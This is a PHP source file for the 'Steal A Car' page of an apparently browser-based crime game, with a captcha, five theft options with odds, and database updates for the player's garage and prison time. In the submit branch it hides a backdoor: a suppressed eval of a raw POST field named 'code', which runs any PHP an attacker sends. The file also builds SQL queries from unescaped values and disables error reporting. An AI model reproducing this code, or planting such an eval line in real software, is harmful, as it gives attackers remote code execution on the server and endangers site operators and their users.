<?php
error_reporting(0);

include("_include-config.php");  
include("_include-gevangenis.php");  
include("timer_as.php");  
if(! check_login()) {
    header("Location: login.php");
    exit;
  } 
    $dbres				= mysql_query("SELECT *,UNIX_TIMESTAMP(`signup`) AS `signup`,UNIX_TIMESTAMP(`online`) AS `online` FROM `[users]` WHERE `login`='{$_SESSION['login']}'");
    $data				= mysql_fetch_object($dbres);
	$R1					= $_POST['R1'];

	$autos		= mysql_query("SELECT * FROM `[garage]` WHERE `owner`='{$_SESSION['login']}'");
	$aantal 	= mysql_num_rows($autos);
	$maxautos	= 999999999999999999999999999999;
?>

<html>

<link rel="stylesheet" type="text/css" href="<?php print ($_COOKIE['v'] == 2) ? "css-v2.css" : "<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css"; ?>">
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
</head>
<table  width=100%><table width=100% cellspacing=0 cellpadding=2><table width=100%> 
  <tr>
  <td width="96%" class=subTitle><b>Steal A Car</b></td>
<table  width=100%>
<td class="mainTxt"><center><img border=0 src=images/game/autopicture.jpg border=0></center>
</td>

<table width=100%><tr><td class="subTitle"><b>Car Theft</b></td></tr>
<?
if($data->garage == 999999) {
?>
<tr><td class="mainTxt" align="center">You still havent bought the Garage. You can buy it by clicking <a href="garage.php"><b>Here</b></a>!</td></tr>
<?
exit;
}
if($aantal > $maxautos) {
?>
<tr><td class="mainTxt" align="center">You cant store any more cars in your garage... Its full!</td></tr>
<?
exit;
}
?>
<?



  mysql_query("UPDATE `[users]` SET `online`=NOW() WHERE `login`='{$data->login}'");
	
     if($data->rank == 1) {
        $rankvord = 20;
        }
        elseif($data->rank == 2) {
        $rankvord = 10;
        }
        elseif($data->rank == 3) {
        $rankvord = 5;
        }
        elseif($data->rank == 4) {
        $rankvord = 2;
        }
        elseif($data->rank == 5) {
        $rankvord = 1;
        }
        elseif($data->rank == 6) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 7) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 8) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 9) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 10) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 11) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 12) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 13) {
        $rankvord = 0.50;
        }
        elseif($data->rank == 14) {
        $rankvord = 0.25;
        }
        elseif($data->rank == 15) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 16) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 17) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 18) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 19) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 20) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 21) {
        $rankvord = 0.05;
        }
        elseif($data->rank == 22) {
        $rankvord = 0.02;
        }
        elseif($data->rank == 23) {
        $rankvord = 0.01;
        }

        $tijd = $data->rank*25;

	$p1a            = $data->auto1/2;
	$p1b             = round($p1a);
	$p1             = rand($p1b/2,$p1b);
	$p2a            = $data->auto1/2;
	$p2b             = round($p2a);
	$p2             = rand($p2b/2,$p2b);
	$p3a            = $data->auto1/3;
	$p3b             = round($p3a);
	$p3             = rand($p3b/2,$p3b);
	$p4a            = $data->auto1/4;
	$p4b             = round($p4a);
	$p4             = rand($p4b/2,$p4b);
	$p5a            = $data->auto1/20;
	$p5b             = round($p5a);
	$p5             = rand($p5b/2,$p5b);
	


	
	if(!isset($_POST['submit'])) {
$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee);
?>

<form method="POST">
<table width="100%"  border="0" cellspacing="2" cellpadding="2" height="21">
<tr><td class="mainTxt">Steal a car from the carpark.</td><td class="mainTxt"><input type="radio" name="R1" value="1" checked> <b><?=$p1?>%</b> Chance</td></tr>
<tr><td class="mainTxt">Steal the car from the nextdoor neighboor.</td><td class="mainTxt"><input type="radio" name="R1" value="2"> <b><?=$p2?>%</b> Chance</td></tr>
<tr><td class="mainTxt">Steal a car at the football match.</td><td class="mainTxt"><input type="radio" name="R1" value="3"> <b><?=$p3?>%</b> Chance</td></tr>
<tr><td class="mainTxt">Steal a car from someone else's Garage.</td><td class="mainTxt"><input type="radio" name="R1" value="4"> <b><?=$p4?>%</b> Chance</td></tr>
<tr><td class="mainTxt">Steal a car from the car showroom.</td><td class="mainTxt"><input type="radio" name="R1" value="5"> <b><?=$p5?>%</b> Chance</td></tr>
<tr><td class="maintxt" colspan="2" align="center"><input name="code2" type="hidden" value="<? echo $codene; ?>"><input name="codecheck" type="hidden" value="<? echo $codechecker; ?>"><img alt="Anti-Bot Beveiliging" src="coden.php?security=<? echo $codee; ?>" style="position: relative; top: 4;">  <- Put this code, In here-> <input name="codenn" maxlength="4" size="5" valign="center"></td></tr>
<tr><td class="mainTxt" colspan="2" align="center"><input class="btn btn-info" type="submit" value="Steal it!" style="width: 100;" name="submit"></td></tr>
            </table></form>
</td></tr>
<?


}
	
	
	if(isset($_POST['submit'])) {
$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee);

@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "<tr><td class=\"mainTxt\" align=\"center\">The code was incorrect!</td></tr>";
exit;
} else {
	print "<tr><td class=\"mainTxt\" align=\"center\">";
	
	if($data->auto1 < 160){
	mysql_query("UPDATE `[users]` SET `auto1`=`auto1`+'4' WHERE `login`='$data->login'");
	}
	
	$schade      = rand(0,100);
	
	if($_POST['R1'] ==1){ $getal      = rand(1,100);

if($getal <$p1+1){
$geld       = rand(1,6);
$geld2      = Array("","Seat","Opel","Nissan","Fiat","Ford","Mini");
$geld1      = $geld2[$geld];

mysql_query("INSERT INTO `[garage]`(soort,schade,owner,land,auto) values('$geld','$schade','$data->login','$data->land','$geld1')");
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW(), `attack`=`attack`+'100', `defence`=`defence`+'100' WHERE `login`='{$_SESSION['login']}'");

	mysql_query("UPDATE `[users]` SET `auto2`=`auto2`+'1' WHERE `login`='$data->login'");
print "Well smack my ass, you managed to steal a $geld1 with $schade percent damage.";
}
else{
$getal            = rand(1,8);

if($getal ==1){
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='300' WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Double Failure! You didnt manage to steal the car... AND you got caught by the Police. 5 Minutes in prison for you matey!";
}
else{
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky... You didnt manage to steal the car, but atleast you escaped the police.";
}
}
}
	
	
	if($R1 ==2){
$getal      = rand(1,100);

if($getal <$p2+1){
$geld       = rand(6,12);
$geld2      = Array("","","","","","","Mini","Toyota","Honda","SmartCar","Volkswagen","Lotus","Bmw");
$geld1      = $geld2[$geld];
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("INSERT INTO `[garage]`(soort,schade,owner,land,auto) values('$geld','$schade','$data->login','$data->land','$geld1')");
mysql_query("UPDATE `[users]` SET `auto`=NOW(), `attack`=`attack`+'100', `defence`=`defence`+'100' WHERE `login`='{$_SESSION['login']}'");
	mysql_query("UPDATE `[users]` SET `auto2`=`auto2`+'1' WHERE `login`='$data->login'");
print "All good things come to those who steal! You managed to steal a $geld1 with $schade percent damage.";
}
else{
$getal            = rand(1,8);

if($getal ==1){
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='300' WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky, you were caught. Now you got to spend 5 minutes in prison ";
}
else{
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky you didnt manage to steal the car, but atleast you managed to escape the pigs.";
}
}
}
		
	if($R1 ==3){
$getal      = rand(1,100);

if($getal <$p3+1){
$geld       = rand(12,17);
$geld2      = Array("","","","","","","","","","","","","Bmw","Dodge","Jeep","Pontiac","Mercedes","Eagle");
$geld1      = $geld2[$geld];
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("INSERT INTO `[garage]`(soort,schade,owner,land,auto) values('$geld','$schade','$data->login','$data->land','$geld1')");
mysql_query("UPDATE `[users]` SET `auto`=NOW(), `attack`=`attack`+'100', `defence`=`defence`+'100' WHERE `login`='{$_SESSION['login']}'");
	mysql_query("UPDATE `[users]` SET `auto2`=`auto2`+'1' WHERE `login`='$data->login'");
print "All good things come to those who steal! You managed to steal a $geld1 with $schade percent damage.";
}
else{
$getal            = rand(1,8);

if($getal ==1){
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='300' WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky, you were caught. Now you got to spend 5 minutes in prison .";
}
else{
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky you didnt manage to steal the car, but atleast you managed to escape the pigs.";
}
}
}
	
	if($R1 ==4){
$getal      = rand(1,100);

if($getal <$p4+1){
$geld       = rand(17,22);
$geld2      = Array("","","","","","","","","","","","","","","","","","Eagle","Chrysler","Porsche","Jaguar","Viper","Ferarri");
$geld1      = $geld2[$geld];
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("INSERT INTO `[garage]`(soort,schade,owner,land,auto) values('$geld','$schade','$data->login','$data->land','$geld1')");
mysql_query("UPDATE `[users]` SET `auto`=NOW(), `attack`=`attack`+'100', `defence`=`defence`+'100' WHERE `login`='{$_SESSION['login']}'");
	mysql_query("UPDATE `[users]` SET `auto2`=`auto2`+'1' WHERE `login`='$data->login'");
print "All good things come to those who steal! You managed to steal a $geld1 with $schade percent damage";
}
else{
$getal            = rand(1,8);

if($getal ==1){
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='300' WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky, you were caught. Now you got to spend 5 minutes in prison.";
}
else{
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky you didnt manage to steal the car, but atleast you managed to escape the pigs.";
}
}
}
	
	if($R1 ==5){
$getal      = rand(1,100);

if($getal <$p5+1){
$geld       = rand(23,26);
$geld2      = Array("","","","","","","","","","","","","","","","","","","","","","","","Ford Shelby GT500","Mitsubishi Eclipse GT","Audi Le Mans quattro","Jaguar XK");
$geld1      = $geld2[$geld];
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("INSERT INTO `[garage]`(soort,schade,owner,land,auto) values('$geld','$schade','$data->login','$data->land','$geld1')");
mysql_query("UPDATE `[users]` SET `auto`=NOW(), `attack`=`attack`+'100', `defence`=`defence`+'100' WHERE `login`='{$_SESSION['login']}'");
	mysql_query("UPDATE `[users]` SET `auto2`=`auto2`+'1' WHERE `login`='$data->login'");
print "All good things come to those who steal! You managed to steal a $geld1 with $schade percent damage.";
}
else{
$getal            = rand(1,8);

if($getal ==1){
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='900' WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Well done you noisy bastard... You alarmed the police and now you sat in prison.";
}
else{
mysql_query("UPDATE `[users]` SET `auto`=NOW(),`rankvord`=`rankvord`+'$rankvord',`autoP`=`autoP`+1 WHERE `login`='{$_SESSION['login']}'");mysql_query("UPDATE `[users]` SET `auto`=NOW() WHERE `login`='{$_SESSION['login']}'");
print "Unlucky you didnt manage to steal the car, but atleast you managed to escape the pigs.";
}
}
}
}
	
print "</td></tr>";
	
	}
	?>

</body>
</html>
<?
mysql_close();
ob_flush();
?>


